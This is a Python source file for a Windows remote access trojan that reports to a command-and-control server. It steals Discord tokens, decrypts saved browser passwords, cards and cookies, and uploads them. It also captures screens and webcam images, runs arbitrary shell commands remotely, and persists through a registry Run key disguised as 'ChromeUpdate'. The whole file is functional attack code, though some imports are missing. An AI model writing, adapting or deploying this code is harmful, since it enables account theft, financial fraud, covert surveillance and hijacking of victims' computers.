import requests
import time
import os
import shutil
import pyautogui
import random
import winreg
import webbrowser
import ctypes
import pyttsx3
import platform
import psutil
import cv2
from pathlib import Path
from win32com.client import Dispatch
from easygui import enterbox
import threading
import subprocess  # Needed for shell command execution
import json
import base64
import sqlite3
# Add new imports
import socketio
from PIL import Image
import io

# Add at the top with other imports
sio = socketio.Client()
stream_enabled = False
stream_thread = None

# VPS endpoint configuration
VPS_URL = "http://YOUR_VPS_URL:5000"  # Replace with your server IP/URL

# File to store the device_id so it remains the same across restarts
DEVICE_ID_FILE = "device_id.txt"

device_id = None
device_name = platform.node()  # Use hostname as the device name

cmd_spam_enabled = False
cmd_spam_thread = None

# 1) Check if we have a saved device_id
if os.path.exists(DEVICE_ID_FILE):
    with open(DEVICE_ID_FILE, "r") as f:
        device_id = f.read().strip()

try:
    if device_id:
        # 2) If we already have a device_id, register again with the same ID (re-register).
        #    The server will accept it and reuse that ID.
        print(f"Found existing device_id: {device_id}. Re-registering with server...")
        data = {"device_id": device_id, "device_name": device_name}
        response = requests.post(f"{VPS_URL}/register_device", json=data)
        response.raise_for_status()
        # We expect the same device_id back.
        device_id = response.json()["device_id"]
    else:
        # 3) No existing device_id; register a brand-new device
        print("No device_id file found; registering a new device...")
        data = {"device_name": device_name}
        response = requests.post(f"{VPS_URL}/register_device", json=data)
        response.raise_for_status()
        device_id = response.json()["device_id"]
        # Save the newly obtained device_id locally
        with open(DEVICE_ID_FILE, "w") as f:
            f.write(device_id)

    print(f"Device registered with ID: {device_id}")

except requests.exceptions.RequestException as e:
    if e.response:
        print(f"Server response: {e.response.text}")
    print(f"Error registering device: {e}")
    exit(1)

# ======== ADD WEBSOCKET CONNECTION HERE ========
try:
    sio.connect(VPS_URL)
    print("Connected to WebSocket server for streaming")
except Exception as e:
    print(f"WebSocket connection error: {e}")

# ======== END OF ADDITION ========

def send_heartbeat():
    """Send a heartbeat signal to the VPS to indicate the device is active."""
    while True:
        try:
            resp = requests.post(f"{VPS_URL}/heartbeat/{device_id}")
            resp.raise_for_status()
            print("Heartbeat sent successfully.")
        except requests.exceptions.RequestException as e:
            print(f"Error sending heartbeat: {e}")
        time.sleep(5)  # Send heartbeat every 5 seconds

heartbeat_thread = threading.Thread(target=send_heartbeat, daemon=True)
heartbeat_thread.start()

def send_screenshots():
    """Continuously send screenshots while streaming is enabled."""
    while True:
        if not stream_enabled:
            time.sleep(1)
            continue
            
        try:
            # Capture and resize screenshot
            screenshot = pyautogui.screenshot()
            screenshot = screenshot.resize((854, 480), Image.Resampling.LANCZOS)
            
            # Convert to JPEG
            buffer = io.BytesIO()
            screenshot.save(buffer, format="JPEG", quality=70)
            encoded_img = base64.b64encode(buffer.getvalue()).decode('utf-8')
            
            # Send via WebSocket
            sio.emit('send_image', encoded_img)
        except Exception as e:
            upload_message(f"Stream error: {str(e)}")
        
        time.sleep(0.2)  # ~5 FPS

def upload_message(message):
    """Send a text response back to the VPS."""
    try:
        resp = requests.post(f"{VPS_URL}/upload_message/{device_id}", json={"message": message})
        resp.raise_for_status()
        print("Message sent to VPS successfully.")
    except requests.exceptions.RequestException as e:
        print(f"Error uploading message to VPS: {e}")

def upload_image(image_path, image_name):
    """Send an image file back to the VPS."""
    try:
        with open(image_path, 'rb') as img_file:
            resp = requests.post(f"{VPS_URL}/upload_image/{device_id}", files={'image': (image_name, img_file)})
            resp.raise_for_status()
            print("Image sent to VPS successfully.")
    except requests.exceptions.RequestException as e:
        print(f"Error uploading image to VPS: {e}")

def upload_file(file_path):
    """Send a file (e.g., text, binary) back to the VPS."""
    try:
        with open(file_path, 'rb') as f:
            resp = requests.post(f"{VPS_URL}/upload_file/{device_id}", files={'file': f})
            resp.raise_for_status()
            print("File sent to VPS successfully.")
    except requests.exceptions.RequestException as e:
        print(f"Error uploading file to VPS: {e}")

# ------------------- CMD Spammer -------------------

def cmd_spammer():
    """Function to continuously open new CMD windows."""
    while cmd_spam_enabled:
        try:
            subprocess.Popen(["start", "cmd"], shell=True)  # Opens a new CMD window
            time.sleep(0.01)  # Adjust speed if needed
        except Exception as e:
            upload_message(f"Error opening CMD window: {str(e)}")


def start_cmd_spam():
    """Start spamming CMD windows in a separate thread."""
    global cmd_spam_enabled, cmd_spam_thread
    if not cmd_spam_enabled:
        cmd_spam_enabled = True
        cmd_spam_thread = threading.Thread(target=cmd_spammer, daemon=True)
        cmd_spam_thread.start()
        upload_message("CMD Spammer started.")

def stop_cmd_spam():
    """Stop the CMD spammer."""
    global cmd_spam_enabled
    cmd_spam_enabled = False
    upload_message("CMD Spammer stopped.")

# ------------------- DISCORD TOKEN GRABBER -------------------
def get_tokens():
    """Return a dictionary: { 'Discord': [token1, token2, ...], 'Opera': [token1, ...] }"""
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    ldb = '\\Local Storage\\leveldb'
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        "Vivaldi" : local + "\\Vivaldi\\User Data\\Default\\"
    }
    grabbed = {}
    token_ids = []

    for platform_name, path in paths.items():
        if not os.path.exists(path):
            continue
        path_ldb = path + ldb
        if not os.path.exists(path_ldb):
            continue

        tokens_found = []
        for file_name in os.listdir(path_ldb):
            if not (file_name.endswith('.log') or file_name.endswith('.ldb')):
                continue

            full_path = os.path.join(path_ldb, file_name)
            try:
                with open(full_path, 'r', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in re.findall(regex, line):
                                # Only add if not repeated
                                if token not in tokens_found:
                                    tokens_found.append(token)
            except:
                pass  # ignore read errors

        if tokens_found:
            grabbed[platform_name] = tokens_found

    return grabbed

def get_user_info(token):
    """Return a dict with username, email, phone, etc. or an error message."""
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    try:
        # Basic /users/@me
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=3)
        if r.status_code != 200:
            return {"error": f"Invalid or unauthorized token: {token[:25]}..."}
        info = r.json()
        return {
            "id": info.get("id"),
            "username": f'{info.get("username")}#{info.get("discriminator")}',
            "email": info.get("email"),
            "phone": info.get("phone"),
            "verified": info.get("verified"),
            "locale": info.get("locale", "")
        }
    except Exception as e:
        return {"error": str(e)}


def grab_discord_tokens_and_send():
    """Gather all Discord tokens + user info and send them to the VPS."""
    # Get public IP once
    try:
        ip_address = requests.get('http://checkip.amazonaws.com', timeout=3).text.strip()
    except:
        ip_address = "N/A"

    tokens_dict = get_tokens()  # { 'Discord': [list_of_tokens], 'Opera': [...] }
    if not tokens_dict:
        upload_message("No Discord tokens found.")
        return

    # We will build a text message that includes all tokens + info
    final_message_lines = []
    final_message_lines.append("**Discord Tokens Found**\n")
    final_message_lines.append(f"Device: {device_name}")
    final_message_lines.append(f"Public IP: {ip_address}\n")

    for platform_name, token_list in tokens_dict.items():
        final_message_lines.append(f"\n--- {platform_name} ---")
        for t in token_list:
            user_info = get_user_info(t)
            if "error" in user_info:
                final_message_lines.append(f"Token: {t} => ERROR: {user_info['error']}")
            else:
                final_message_lines.append(f"Token: {t}")
                final_message_lines.append(f"   Username: {user_info['username']}")
                final_message_lines.append(f"   User ID: {user_info['id']}")
                final_message_lines.append(f"   Email: {user_info['email']}")
                final_message_lines.append(f"   Phone: {user_info['phone']}")
                final_message_lines.append(f"   Verified: {user_info['verified']}")
                final_message_lines.append(f"   Locale: {user_info['locale']}")

    # Combine into one large string
    msg_to_send = "\n".join(final_message_lines)
    upload_message(msg_to_send)

# ------------------- END OF DISCORD TOKEN GRABBER -------------------

# --------------- NEW CODE FOR BROWSER DATA EXTRACTION ---------------
browsers = {
    'avast':        os.getenv('LOCALAPPDATA') + '\\AVAST Software\\Browser\\User Data',
    'amigo':        os.getenv('LOCALAPPDATA') + '\\Amigo\\User Data',
    'torch':        os.getenv('LOCALAPPDATA') + '\\Torch\\User Data',
    'kometa':       os.getenv('LOCALAPPDATA') + '\\Kometa\\User Data',
    'orbitum':      os.getenv('LOCALAPPDATA') + '\\Orbitum\\User Data',
    'cent-browser': os.getenv('LOCALAPPDATA') + '\\CentBrowser\\User Data',
    '7star':        os.getenv('LOCALAPPDATA') + '\\7Star\\7Star\\User Data',
    'sputnik':      os.getenv('LOCALAPPDATA') + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi':      os.getenv('LOCALAPPDATA') + '\\Vivaldi\\User Data',
    'chromium':     os.getenv('LOCALAPPDATA') + '\\Chromium\\User Data',
    'chrome-canary':os.getenv('LOCALAPPDATA') + '\\Google\\Chrome SxS\\User Data',
    'chrome':       os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': os.getenv('LOCALAPPDATA') + '\\Epic Privacy Browser\\User Data',
    'msedge':       os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data',
    'msedge-canary':os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta':  os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev':   os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge Dev\\User Data',
    'uran':         os.getenv('LOCALAPPDATA') + '\\uCozMedia\\Uran\\User Data',
    'yandex':       os.getenv('LOCALAPPDATA') + '\\Yandex\\YandexBrowser\\User Data',
    'brave':        os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium':      os.getenv('LOCALAPPDATA') + '\\Iridium\\User Data',
    'coccoc':       os.getenv('LOCALAPPDATA') + '\\CocCoc\\Browser\\User Data',
    'opera':        os.getenv('APPDATA') + '\\Opera Software\\Opera Stable',
    'opera-gx':     os.getenv('APPDATA') + '\\Opera Software\\Opera GX Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}


def get_master_key(path: str):
    """Extract the master key used for AES decryption."""
    if not os.path.exists(path):
        return None

    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    # Decode base64 key and remove DPAPI prefix
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix

    try:
        decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except:
        return None


from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

def decrypt_password(buff: bytes, key: bytes) -> str:
    """Decrypt AES-GCM encrypted password data from Chrome's database."""
    try:
        iv = buff[3:15]  # First 3 bytes are ignored, next 12 bytes are IV
        payload = buff[15:]  # Encrypted password data

        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)

        # Remove GCM authentication tag (last 16 bytes)
        decrypted_pass = decrypted_pass[:-16].decode('utf-8', errors='ignore')
        return decrypted_pass
    except Exception as e:
        return f"[ERROR] Failed to decrypt: {str(e)}"



def convert_chrome_time(chrome_time):
    """Convert Chrome's microsecond timestamp to human-readable format."""
    try:
        return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
    except:
        return "0"


def get_data(path: str, profile: str, master_key, type_of_data):
    """Extract and decrypt data from browser SQLite databases."""
    db_file = os.path.join(path, profile + type_of_data["file"])
    if not os.path.exists(db_file):
        return ""

    result = ""
    temp_db_copy = "temp_db"

    try:
        shutil.copy(db_file, temp_db_copy)
    except:
        return f"[ERROR] Cannot access {type_of_data['file']}"

    try:
        conn = sqlite3.connect(temp_db_copy)
        cursor = conn.cursor()
        cursor.execute(type_of_data['query'])

        for row in cursor.fetchall():
            row = list(row)

            if type_of_data['decrypt'] and master_key:
                for i in range(len(row)):
                    if isinstance(row[i], bytes) and row[i]:
                        row[i] = decrypt_password(row[i], master_key)

            result += "\n".join(f"{col}: {val}" for col, val in zip(type_of_data['columns'], row))
            result += "\n\n"

        conn.close()
    except Exception as e:
        return f"[ERROR] Failed to read database: {e}"
    finally:
        os.remove(temp_db_copy)

    return result



def installed_browsers():
    """Return a list of browser names (keys in `browsers`) that appear to be installed."""
    available = []
    for name, path in browsers.items():
        if path and os.path.exists(os.path.join(path, "Local State")):
            available.append(name)
    return available


def gather_browser_data():
    """
    Main function to gather login data, cookies, history, downloads, etc.
    from all installed Chromium-based browsers.
    Then zip them up and upload the results to the server.
    """
    # Create a temp folder to store extracted data
    output_folder = "browser_data"
    if not os.path.exists(output_folder):
        os.mkdir(output_folder)

    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        print(f"Gathering data from: {browser} => {browser_path}")
        browser_output_folder = os.path.join(output_folder, browser)
        if not os.path.exists(browser_output_folder):
            os.mkdir(browser_output_folder)

        # Some browsers might have different default profiles
        # Opera/Opera GX sometimes just store data in root path, so handle that
        notdefault = ['opera', 'opera-gx']  # you can add more if needed
        profile = "Default"
        if browser in notdefault:
            profile = ""  # e.g. Opera does not use "Default" folder

        # Gather each type of data
        for data_type_name, data_type in data_queries.items():
            print(f"\tExtracting: {data_type_name}")
            extracted_text = get_data(browser_path, profile, master_key, data_type)
            if extracted_text.strip():
                # Save to a text file
                out_file = os.path.join(browser_output_folder, f"{data_type_name}.txt")
                with open(out_file, 'w', encoding='utf-8') as f:
                    f.write(extracted_text)
            else:
                print(f"\t\tNo data found for {data_type_name}.")

    # Now zip the entire folder and upload
    zip_name = "browser_data"
    try:
        shutil.make_archive(zip_name, 'zip', output_folder)  # creates browser_data.zip
        upload_file(zip_name + ".zip")
    except Exception as e:
        upload_message(f"Error zipping or uploading browser data: {e}")

    # Cleanup local folder and zip
    try:
        os.remove(zip_name + ".zip")
        shutil.rmtree(output_folder)
    except:
        pass

    upload_message("Browser data collection completed.")


# ------------------- END BROWSER DATA EXTRACTION -------------------

def execute_command(command, data):
    """Execute a command locally."""
    global stream_enabled, stream_thread
    try:
        if command == "chat":
            client_message = enterbox(data, title="Remote Chat")
            if client_message:
                upload_message(f"User entered: {client_message}")
            else:
                upload_message("No input provided by the user.")

        elif command == "ip_info":
            try:
                url = "http://ip-api.com/json"
                r = requests.get(url)
                r.raise_for_status()
                ip_info_data = r.json()
                upload_message(f"IP Info: {ip_info_data}")
            except requests.exceptions.RequestException as e:
                upload_message(f"Error fetching IP info: {e}")

        elif command == "dir_ls":
            try:
                path = data.strip() if data.strip() else "."
                items = os.listdir(path)
                upload_message(f"Directory contents of '{path}':\n" + "\n".join(items))
            except Exception as e:
                upload_message(f"Error listing directory '{data}': {str(e)}")

        elif command == "move_mouse":
            x, y = random.randint(0, 1920), random.randint(0, 1080)
            pyautogui.moveTo(x, y)
            upload_message(f"Moved mouse to: {x}, {y}")

        elif command == "open_website":
            webbrowser.open(data)
            upload_message(f"Website opened: {data}")

        elif command == "screen_shot":
            try:
                screenshot_path = os.path.join(os.getcwd(), "screenshot.png")
                screenshot = pyautogui.screenshot()
                screenshot.save(screenshot_path)
                upload_image(screenshot_path, "screenshot.png")
            except Exception as e:
                upload_message(f"Error taking screenshot: {str(e)}")

        elif command == "send_key_press":
            pyautogui.write(data)
            upload_message(f"Sent keystrokes: {data}")

        elif command == "show_popup":
            # 0x30 => MB_ICONWARNING + OK button
            ctypes.windll.user32.MessageBoxW(0, data, "hmmm...", 0x30)
            upload_message("Popup shown.")

        elif command == "text_speaker":
            try:
                engine = pyttsx3.init()
                engine.say(data)
                engine.runAndWait()
                upload_message("Text spoken via text-to-speech.")
            except Exception as e:
                upload_message(f"Error with text-to-speech: {str(e)}")

        elif command == "webcam_snap":
            try:
                camera = cv2.VideoCapture(0)
                webcam_image_path = os.path.join(os.getcwd(), "webcam.jpg")
                ret, frame = camera.read()
                if ret:
                    cv2.imwrite(webcam_image_path, frame)
                    upload_image(webcam_image_path, "webcam.jpg")
                else:
                    upload_message("Failed to capture image from webcam.")
                camera.release()
            except Exception as e:
                upload_message(f"Error capturing webcam image: {str(e)}")

        elif command == "system_info":
            sys_info = platform.uname()
            mem = psutil.virtual_memory()
            hdd = psutil.disk_usage("/")
            response_text = (
                f"System Info:\n"
                f"System: {sys_info.system}\n"
                f"Node Name: {sys_info.node}\n"
                f"Release: {sys_info.release}\n"
                f"Version: {sys_info.version}\n"
                f"Machine: {sys_info.machine}\n"
                f"Processor: {sys_info.processor}\n"
                f"Memory (Total/Free): {mem.total / (1024**3):.2f}GB / {mem.available / (1024**3):.2f}GB\n"
                f"HDD (Total/Free): {hdd.total / (1024**3):.2f}GB / {hdd.free / (1024**3):.2f}GB"
            )
            upload_message(response_text)

        elif command == "get_file":
            file_path = data.strip()
            if os.path.isfile(file_path):
                upload_file(file_path)
            else:
                upload_message(f"Error: File '{file_path}' does not exist.")

        elif command == "grab_discord_tokens":
            # Our new command to grab tokens and send to the panel
            grab_discord_tokens_and_send()

        elif command == "grab_chrome_data":
            # <-- Your new command to gather browser data
            gather_browser_data()

        elif command == "shell_exec":
            # Execute an arbitrary shell command
            try:
                result = subprocess.check_output(data, shell=True, universal_newlines=True)
                upload_message(f"Shell execution output:\n{result}")
            except subprocess.CalledProcessError as cpe:
                upload_message(
                    f"Error executing shell command (code {cpe.returncode}):\n{cpe.output}"
                )
            except Exception as e:
                upload_message(f"Error executing shell command: {str(e)}")

        elif command == "cmd_spammer_on":
            start_cmd_spam()

        elif command == "cmd_spammer_off":
            stop_cmd_spam()

        elif command == "start_stream":
            if not stream_enabled:
                stream_enabled = True
                if not stream_thread or not stream_thread.is_alive():
                    stream_thread = threading.Thread(target=send_screenshots, daemon=True)
                    stream_thread.start()
                upload_message("Screen sharing started")
            
        elif command == "stop_stream":
            stream_enabled = False
            upload_message("Screen sharing stopped")

        else:
            upload_message(f"Unknown command: {command}")

    except Exception as e:
        upload_message(f"Error executing command '{command}': {str(e)}")

import shutil
import winreg

def setup_self():
    """
    Copies chrome.exe to the Startup folder and creates a registry entry for persistence.
    """
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    chrome_source_path = os.path.join(os.getcwd(), "chrome.exe")  # Assumes chrome.exe is in the script directory
    chrome_destination_path = os.path.join(startup_folder, "chrome.exe")

    try:
        # Copy chrome.exe to Startup folder
        if not os.path.exists(chrome_destination_path):
            shutil.copy(chrome_source_path, chrome_destination_path)
            print(f"✅ Chrome.exe copied to {chrome_destination_path}")
        else:
            print(f"ℹ️ Chrome.exe already exists in {chrome_destination_path}")

        # Create Registry Key for Persistence
        registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "ChromeUpdate", 0, winreg.REG_SZ, chrome_destination_path)
            print("✅ Registry key for startup persistence added.")

    except Exception as e:
        print(f"❌ Error setting up persistence: {e}")


if __name__ == "__main__":
    setup_self()

    # Main loop: poll for new commands from the server
    while True:
        try:
            resp = requests.get(f"{VPS_URL}/get_command/{device_id}")
            resp.raise_for_status()
            cmd_info = resp.json()
            command = cmd_info.get("command")
            data = cmd_info.get("data", "")

            if command:
                print(f"Executing command: {command} with data: {data}")
                execute_command(command, data)

                # Clear the command after execution
                requests.post(f"{VPS_URL}/clear_command/{device_id}")

        except requests.exceptions.RequestException as e:
            print(f"Error fetching command: {e}")

        time.sleep(0.2)
